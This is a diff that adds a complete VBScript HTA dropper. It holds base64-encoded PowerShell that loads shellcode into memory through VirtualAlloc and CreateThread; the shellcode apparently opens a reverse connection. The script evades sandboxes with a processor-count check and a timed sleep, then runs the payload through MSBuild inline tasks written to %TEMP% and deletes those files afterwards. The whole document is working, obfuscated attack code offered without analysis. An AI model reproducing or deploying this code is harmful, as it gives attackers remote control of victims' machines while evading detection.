@@ -1,0 +1,118 @@
+<script language=vbscript>
+  On Error Resume Next
+
+  Set objFSO = CreateObject("Scripting.FileSystemObject")
+  Set objShell = CreateObject("WScript.Shell")
+  objTemp = objShell.ExpandEnvironmentStrings("%TEMP%")
+  objWindir = objShell.ExpandEnvironmentStrings("%windir%")
+  Set objWMIService = GetObject("winmgmts:\\.\root\CIMV2")
+  arrUnicorns = Array("JHVhcXVQSkNoID0gQCINCltEbGxJbXBvcnQoImtlcm5lbDMyLmRsbCIpXQ0KcHVibGljIHN0YXRpYyBleHRlcm4gSW50UHRyIFZpcnR1YWxBbGxvYyhJbnRQdHIgbHBBZGRyZXNzLCB1aW50IGR3U2l6ZSwgdWludCBmbEFsbG9jYXRpb25UeXBlLCB1aW50IGZsUHJvdGVjdCk7DQpbRGxsSW1wb3J0KCJrZXJuZWwzMi5kbGwiKV0NCnB1YmxpYyBzdGF0aWMgZXh0ZXJuIEludFB0ciBDcmVhdGVUaHJlYWQoSW50UHRyIGxwVGhyZWFkQXR0cmlidXRlcywgdWludCBkd1N0YWNrU2l6ZSwgSW50UHRyIGxwU3RhcnRBZGRyZXNzLCBJbnRQdHIgbHBQYXJhbWV0ZXIsIHVpbnQgZHdDcmVhdGlvbkZsYWdzLCBJbnRQdHIgbHBUaHJlYWRJZCk7DQoiQA0KDQokSlhBQVBjRGp3U0JtVE5pID0gQWRkLVR5cGUgLW1lbWJlckRlZmluaXRpb24gJHVhcXVQSkNoIC1OYW1lICJXaW4zMiIgLW5hbWVzcGFjZSBXaW4zMkZ1bmN0aW9ucyAtcGFzc3RocnUNCg0KW0J5dGVbXV0gJEpWZFVDdGJiSkcgPSAweGZjLDB4ZTgsMHg4MiwweDAsMHgwLDB4MCwweDYwLDB4ODksMHhlNSwweDMxLDB4YzAsMHg2NCwweDhiLDB4NTAsMHgzMCwweDhiLDB4NTIsMHhjLDB4OGIsMHg1MiwweDE0LDB4OGIsMHg3MiwweDI4LDB4ZiwweGI3LDB4NGEsMHgyNiwweDMxLDB4ZmYsMHhhYywweDNjLDB4NjEsMHg3YywweDIsMHgyYywweDIwLDB4YzEsMHhjZiwweGQsMHgxLDB4YzcsMHhlMiwweGYyLDB4NTIsMHg1NywweDhiLDB4NTIsMHgxMCwweDhiLDB4NGEsMHgzYywweDhiLDB4NGMsMHgxMSwweDc4LDB4ZTMsMHg0OCwweDEsMHhkMSwweDUxLDB4OGIsMHg1OSwweDIwLDB4MSwweGQzLDB4OGIsMHg0OSwweDE4LDB4ZTMsMHgzYSwweDQ5LDB4OGIsMHgzNCwweDhiLDB4MSwweGQ2LDB4MzEsMHhmZiwweGFjLDB4YzEsMHhjZiwweGQsMHgxLDB4YzcsMHgzOCwweGUwLDB4NzUsMHhmNiwweDMsMHg3ZCwweGY4LDB4M2IsMHg3ZCwweDI0LDB4NzUsMHhlNCwweDU4LDB4OGIsMHg1OCwweDI0LDB4MSwweGQzLDB4NjYsMHg4YiwweGMsMHg0YiwweDhiLDB4NTgsMHgxYywweDEsMHhkMywweDhiLDB4NCwweDhiLDB4MSwweGQwLDB4ODksMHg0NCwweDI0LDB4MjQsMHg1YiwweDViLDB4NjEsMHg1OSwweDVhLDB4NTEsMHhmZiwweGUwLDB4NWYsMHg1ZiwweDVhLDB4OGIsMHgxMiwweGViLDB4OGQsMHg1ZCwweDY4LDB4MzMsMHgzMiwweDAsMHgwLDB4NjgsMHg3NywweDczLDB4MzIsMHg1ZiwweDU0LDB4NjgsMHg0YywweDc3LDB4MjYsMHg3LDB4ZmYsMHhkNSwweGI4LDB4OTAsMHgxLDB4MCwweDAsMHgyOSwweGM0LDB4NTQsMHg1MCwweDY4LDB4MjksMHg4MCwweDZiLDB4MCwweGZmLDB4ZDUsMHg2YSwweGEsMHg2OCwweGFjLDB4MTAsMHg1MSwweDU3LDB4NjgsMHgyLDB4MCwweDEsMHhiYiwweDg5LDB4ZTYsMHg1MCwweDUwLDB4NTAsMHg1MCwweDQwLDB4NTAsMHg0MCwweDUwLDB4NjgsMHhlYSwweGYsMHhkZiwweGUwLDB4ZmYsMHhkNSwweDk3LDB4NmEsMHgxMCwweDU2LDB4NTcsMHg2OCwweDk5LDB4YTUsMHg3NCwweDYxLDB4ZmYsMHhkNSwweDg1LDB4YzAsMHg3NCwweGEsMHhmZiwweDRlLDB4OCwweDc1LDB4ZWMsMHhlOCwweDYxLDB4MCwweDAsMHgwLDB4NmEsMHgwLDB4NmEsMHg0LDB4NTYsMHg1NywweDY4LDB4MiwweGQ5LDB4YzgsMHg1ZiwweGZmLDB4ZDUsMHg4MywweGY4LDB4MCwweDdlLDB4MzYsMHg4YiwweDM2LDB4NmEsMHg0MCwweDY4LDB4MCwweDEwLDB4MCwweDAsMHg1NiwweDZhLDB4MCwweDY4LDB4NTgsMHhhNCwweDUzLDB4ZTUsMHhmZiwweGQ1LDB4OTMsMHg1MywweDZhLDB4MCwweDU2LDB4NTMsMHg1NywweDY4LDB4MiwweGQ5LDB4YzgsMHg1ZiwweGZmLDB4ZDUsMHg4MywweGY4LDB4MCwweDdkLDB4MjIsMHg1OCwweDY4LDB4MCwweDQwLDB4MCwweDAsMHg2YSwweDAsMHg1MCwweDY4LDB4YiwweDJmLDB4ZiwweDMwLDB4ZmYsMHhkNSwweDU3LDB4NjgsMHg3NSwweDZlLDB4NGQsMHg2MSwweGZmLDB4ZDUsMHg1ZSwweDVlLDB4ZmYsMHhjLDB4MjQsMHhlOSwweDcxLDB4ZmYsMHhmZiwweGZmLDB4MSwweGMzLDB4MjksMHhjNiwweDc1LDB4YzcsMHhjMywweGJiLDB4ZjAsMHhiNSwweGEyLDB4NTYsMHg2YSwweDAsMHg1MywweGZmLDB4ZDUNCg0KDQokc1dZU1VGQlhZRmEgPSAkSlhBQVBjRGp3U0JtVE5pOjpWaXJ0dWFsQWxsb2MoMCxbTWF0aF06Ok1heCgkSlZkVUN0YmJKRy5MZW5ndGgsMHgxMDAwKSwweDMwMDAsMHg0MCkNCg0KW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6Q29weSgkSlZkVUN0YmJKRywwLCRzV1lTVUZCWFlGYSwkSlZkVUN0YmJKRy5MZW5ndGgpDQoNCiRKWEFBUGNEandTQm1UTmk6OkNyZWF0ZVRocmVhZCgwLDAsJHNXWVNVRkJYWUZhLDAsMCwwKQ0KZm9yICg7Oyl7CiAgU3RhcnQtc2xlZXAgNjAKfQ==", _
+	"JGNwUlpuSnFjWnFCTiA9IEAiDQpbRGxsSW1wb3J0KCJrZXJuZWwzMi5kbGwiKV0NCnB1YmxpYyBzdGF0aWMgZXh0ZXJuIEludFB0ciBWaXJ0dWFsQWxsb2MoSW50UHRyIGxwQWRkcmVzcywgdWludCBkd1NpemUsIHVpbnQgZmxBbGxvY2F0aW9uVHlwZSwgdWludCBmbFByb3RlY3QpOw0KW0RsbEltcG9ydCgia2VybmVsMzIuZGxsIildDQpwdWJsaWMgc3RhdGljIGV4dGVybiBJbnRQdHIgQ3JlYXRlVGhyZWFkKEludFB0ciBscFRocmVhZEF0dHJpYnV0ZXMsIHVpbnQgZHdTdGFja1NpemUsIEludFB0ciBscFN0YXJ0QWRkcmVzcywgSW50UHRyIGxwUGFyYW1ldGVyLCB1aW50IGR3Q3JlYXRpb25GbGFncywgSW50UHRyIGxwVGhyZWFkSWQpOw0KIkANCg0KJEJPTXFLZmVmbGVadSA9IEFkZC1UeXBlIC1tZW1iZXJEZWZpbml0aW9uICRjcFJabkpxY1pxQk4gLU5hbWUgIldpbjMyIiAtbmFtZXNwYWNlIFdpbjMyRnVuY3Rpb25zIC1wYXNzdGhydQ0KDQpbQnl0ZVtdXSAkSXR1ZkRySXJmbW8gPSAweGZjLDB4ZTgsMHg4MiwweDAsMHgwLDB4MCwweDYwLDB4ODksMHhlNSwweDMxLDB4YzAsMHg2NCwweDhiLDB4NTAsMHgzMCwweDhiLDB4NTIsMHhjLDB4OGIsMHg1MiwweDE0LDB4OGIsMHg3MiwweDI4LDB4ZiwweGI3LDB4NGEsMHgyNiwweDMxLDB4ZmYsMHhhYywweDNjLDB4NjEsMHg3YywweDIsMHgyYywweDIwLDB4YzEsMHhjZiwweGQsMHgxLDB4YzcsMHhlMiwweGYyLDB4NTIsMHg1NywweDhiLDB4NTIsMHgxMCwweDhiLDB4NGEsMHgzYywweDhiLDB4NGMsMHgxMSwweDc4LDB4ZTMsMHg0OCwweDEsMHhkMSwweDUxLDB4OGIsMHg1OSwweDIwLDB4MSwweGQzLDB4OGIsMHg0OSwweDE4LDB4ZTMsMHgzYSwweDQ5LDB4OGIsMHgzNCwweDhiLDB4MSwweGQ2LDB4MzEsMHhmZiwweGFjLDB4YzEsMHhjZiwweGQsMHgxLDB4YzcsMHgzOCwweGUwLDB4NzUsMHhmNiwweDMsMHg3ZCwweGY4LDB4M2IsMHg3ZCwweDI0LDB4NzUsMHhlNCwweDU4LDB4OGIsMHg1OCwweDI0LDB4MSwweGQzLDB4NjYsMHg4YiwweGMsMHg0YiwweDhiLDB4NTgsMHgxYywweDEsMHhkMywweDhiLDB4NCwweDhiLDB4MSwweGQwLDB4ODksMHg0NCwweDI0LDB4MjQsMHg1YiwweDViLDB4NjEsMHg1OSwweDVhLDB4NTEsMHhmZiwweGUwLDB4NWYsMHg1ZiwweDVhLDB4OGIsMHgxMiwweGViLDB4OGQsMHg1ZCwweDY4LDB4MzMsMHgzMiwweDAsMHgwLDB4NjgsMHg3NywweDczLDB4MzIsMHg1ZiwweDU0LDB4NjgsMHg0YywweDc3LDB4MjYsMHg3LDB4ZmYsMHhkNSwweGI4LDB4OTAsMHgxLDB4MCwweDAsMHgyOSwweGM0LDB4NTQsMHg1MCwweDY4LDB4MjksMHg4MCwweDZiLDB4MCwweGZmLDB4ZDUsMHg2YSwweGEsMHg2OCwweGFjLDB4MTAsMHg1MSwweDU3LDB4NjgsMHgyLDB4MCwweDEsMHhiYiwweDg5LDB4ZTYsMHg1MCwweDUwLDB4NTAsMHg1MCwweDQwLDB4NTAsMHg0MCwweDUwLDB4NjgsMHhlYSwweGYsMHhkZiwweGUwLDB4ZmYsMHhkNSwweDk3LDB4NmEsMHgxMCwweDU2LDB4NTcsMHg2OCwweDk5LDB4YTUsMHg3NCwweDYxLDB4ZmYsMHhkNSwweDg1LDB4YzAsMHg3NCwweGEsMHhmZiwweDRlLDB4OCwweDc1LDB4ZWMsMHhlOCwweDYxLDB4MCwweDAsMHgwLDB4NmEsMHgwLDB4NmEsMHg0LDB4NTYsMHg1NywweDY4LDB4MiwweGQ5LDB4YzgsMHg1ZiwweGZmLDB4ZDUsMHg4MywweGY4LDB4MCwweDdlLDB4MzYsMHg4YiwweDM2LDB4NmEsMHg0MCwweDY4LDB4MCwweDEwLDB4MCwweDAsMHg1NiwweDZhLDB4MCwweDY4LDB4NTgsMHhhNCwweDUzLDB4ZTUsMHhmZiwweGQ1LDB4OTMsMHg1MywweDZhLDB4MCwweDU2LDB4NTMsMHg1NywweDY4LDB4MiwweGQ5LDB4YzgsMHg1ZiwweGZmLDB4ZDUsMHg4MywweGY4LDB4MCwweDdkLDB4MjIsMHg1OCwweDY4LDB4MCwweDQwLDB4MCwweDAsMHg2YSwweDAsMHg1MCwweDY4LDB4YiwweDJmLDB4ZiwweDMwLDB4ZmYsMHhkNSwweDU3LDB4NjgsMHg3NSwweDZlLDB4NGQsMHg2MSwweGZmLDB4ZDUsMHg1ZSwweDVlLDB4ZmYsMHhjLDB4MjQsMHhlOSwweDcxLDB4ZmYsMHhmZiwweGZmLDB4MSwweGMzLDB4MjksMHhjNiwweDc1LDB4YzcsMHhjMywweGJiLDB4ZjAsMHhiNSwweGEyLDB4NTYsMHg2YSwweDAsMHg1MywweGZmLDB4ZDUNCg0KDQokR2JjcnZmVG5DY2htVmdiID0gJEJPTXFLZmVmbGVadTo6VmlydHVhbEFsbG9jKDAsW01hdGhdOjpNYXgoJEl0dWZEcklyZm1vLkxlbmd0aCwweDEwMDApLDB4MzAwMCwweDQwKQ0KDQpbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpDb3B5KCRJdHVmRHJJcmZtbywwLCRHYmNydmZUbkNjaG1WZ2IsJEl0dWZEcklyZm1vLkxlbmd0aCkNCg0KJEJPTXFLZmVmbGVadTo6Q3JlYXRlVGhyZWFkKDAsMCwkR2JjcnZmVG5DY2htVmdiLDAsMCwwKQ0KZm9yICg7Oyl7CiAgU3RhcnQtc2xlZXAgNjAKfQ==")
+
+  ' Get logical processor count
+  Set colComputerSystem = objWMIService.ExecQuery("SELECT * FROM Win32_ComputerSystem")
+  For Each objComputerSystem In colComputerSystem
+    objProcessorCount = objComputerSystem.NumberofLogicalProcessors
+  Next
+
+  ' Only run if system has more than 1 processor
+  ' https://www.trustedsec.com/may-2015/bypassing-virtualization-and-sandbox-technologies/
+  If objProcessorCount > 1 Then
+    ' Sleep 60 seconds
+    ' https://www.sans.org/reading-room/whitepapers/malicious/sleeping-sandbox-35797
+    objShell.Run "%COMSPEC% /c ping -n 60 127.0.0.1>nul", 0, 1
+
+    For Each objUnicorn in arrUnicorns
+      x = x + 1
+
+      ' Create MSBuild XML File
+      CreateMSBuildXML objUnicorn, x
+
+      ' Execute resource(x).xml using msbuild.exe and nps
+      objShell.Run objWindir & "\Microsoft.NET\Framework\v4.0.30319\msbuild.exe %TEMP%\resource" & x & ".xml", 0
+    Next
+
+    ' Cleanup
+    For y = 1 To x
+      Do While objFSO.FileExists(objTemp & "\resource" & y & ".xml")
+        objShell.Run "%COMSPEC% /c ping -n 10 127.0.0.1>nul", 0, 1
+        objFSO.DeleteFile(objTemp & "\resource" & y & ".xml")
+      Loop
+    Next
+  End If
+
+  window.close()
+
+  ' Creates XML configuration files in the %TEMP% directory
+  Function CreateMSBuildXML(objUnicorn, x)
+    msbuildXML = "<Project ToolsVersion=" & CHR(34) & "4.0" & CHR(34) & " xmlns=" & CHR(34) & "http://schemas.microsoft.com/developer/msbuild/2003" & CHR(34) & ">" & vbCrLf &_
+    "  <!-- This inline task executes c# code. -->" & vbCrLf &_
+    "  <!-- C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe nps.xml -->" & vbCrLf &_
+    "  <!-- Original MSBuild Author: Casey Smith, Twitter: @subTee -->" & vbCrLf &_
+    "  <!-- NPS Created By: Ben Ten, Twitter: @ben0xa -->" & vbCrLf &_
+    "  <!-- License: BSD 3-Clause -->" & vbCrLf &_
+    "  <Target Name=" & CHR(34) & "npscsharp" & CHR(34) & ">" & vbCrLf &_
+    "   <nps />" & vbCrLf &_
+    "  </Target>" & vbCrLf &_
+    "  <UsingTask" & vbCrLf &_
+    "    TaskName=" & CHR(34) & "nps" & CHR(34) & "" & vbCrLf &_
+    "    TaskFactory=" & CHR(34) & "CodeTaskFactory" & CHR(34) & "" & vbCrLf &_
+    "    AssemblyFile=" & CHR(34) & "C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" & CHR(34) & " >" & vbCrLf &_
+    "  <Task>" & vbCrLf &_
+    "    <Reference Include=" & CHR(34) & "System.Management.Automation" & CHR(34) & " />" & vbCrLf &_
+    "      <Code Type=" & CHR(34) & "Class" & CHR(34) & " Language=" & CHR(34) & "cs" & CHR(34) & ">" & vbCrLf &_
+    "        <![CDATA[" & vbCrLf &_
+    "" & vbCrLf &_
+    "          using System;" & vbCrLf &_
+    "      using System.Collections.ObjectModel;" & vbCrLf &_
+    "      using System.Management.Automation;" & vbCrLf &_
+    "      using System.Management.Automation.Runspaces;" & vbCrLf &_
+    "      using Microsoft.Build.Framework;" & vbCrLf &_
+    "      using Microsoft.Build.Utilities;" & vbCrLf &_
+    "" & vbCrLf &_
+    "      public class nps : Task, ITask" & vbCrLf &_
+    "        {" & vbCrLf &_
+    "            public override bool Execute()" & vbCrLf &_
+    "            {" & vbCrLf &_
+    "              string cmd = " & CHR(34) & objUnicorn & CHR(34) & ";" & vbCrLf &_
+    "              " & vbCrLf &_
+    "                PowerShell ps = PowerShell.Create();" & vbCrLf &_
+    "                ps.AddScript(Base64Decode(cmd));" & vbCrLf &_
+    "" & vbCrLf &_
+    "                Collection<PSObject> output = null;" & vbCrLf &_
+    "                try" & vbCrLf &_
+    "                {" & vbCrLf &_
+    "                    output = ps.Invoke();" & vbCrLf &_
+    "                }" & vbCrLf &_
+    "                catch(Exception e)" & vbCrLf &_
+    "                {" & vbCrLf &_
+    "                    Console.WriteLine(" & CHR(34) & "Error while executing the script.\r\n" & CHR(34) & " + e.Message.ToString());" & vbCrLf &_
+    "                }" & vbCrLf &_
+    "                if (output != null)" & vbCrLf &_
+    "                {" & vbCrLf &_
+    "                    foreach (PSObject rtnItem in output)" & vbCrLf &_
+    "                    {" & vbCrLf &_
+    "                        Console.WriteLine(rtnItem.ToString());" & vbCrLf &_
+    "                    }" & vbCrLf &_
+    "                }" & vbCrLf &_
+    "                return true;" & vbCrLf &_
+    "            }" & vbCrLf &_
+    "" & vbCrLf &_
+    "            public static string Base64Encode(string text) {" & vbCrLf &_
+    "           return System.Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(text));" & vbCrLf &_
+    "        }" & vbCrLf &_
+    "" & vbCrLf &_
+    "        public static string Base64Decode(string encodedtext) {" & vbCrLf &_
+    "            return System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String(encodedtext));" & vbCrLf &_
+    "        }" & vbCrLf &_
+    "        }" & vbCrLf &_
+    "        ]]>" & vbCrLf &_
+    "      </Code>" & vbCrLf &_
+    "    </Task>" & vbCrLf &_
+    "  </UsingTask>" & vbCrLf &_
+    "</Project>"
+    Set objFile = objFSO.CreateTextFile(objTemp & "\resource" & x & ".xml", True)
+    objFile.WriteLine(msbuildXML)
+    objFile.Close
+  End Function
+</script>
